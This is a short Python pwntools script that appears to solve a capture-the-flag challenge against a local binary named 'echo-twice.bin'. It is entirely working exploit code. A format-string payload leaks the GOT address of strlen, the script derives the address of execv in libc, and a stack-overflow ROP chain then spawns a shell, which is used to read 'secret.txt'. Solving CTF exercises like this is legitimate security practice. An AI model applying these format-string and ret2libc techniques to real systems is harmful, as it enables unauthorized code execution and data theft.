#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./echo-twice.bin")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    execv_offset = libc.symbols['execv']
    strlen_offset = libc.symbols['strlen']
    rdi_gadget = p64(0x400923)
    p.recvuntil(b"safely\n")
    payload = b"%c%c%c%c%c%c%c%c%c%ca%sa" + p64(0x601028) 
    p.sendline(payload)
    sleep(0.5)
    re = p.recvline()
    re = re[11:17] + b"\x00\x00"
    strlen_addr = u64(re)
    execv_addr = strlen_addr - (strlen_offset - execv_offset)
    payload = b"\0"*40 + rdi_gadget + p64(0x4009ae) + p64(execv_addr)
    p.sendline(payload)
    p.recv()
    sleep(0.5)
    p.sendline(b"cat secret.txt")
    print(p.recv())
    

if __name__ == "__main__":
    exploit()
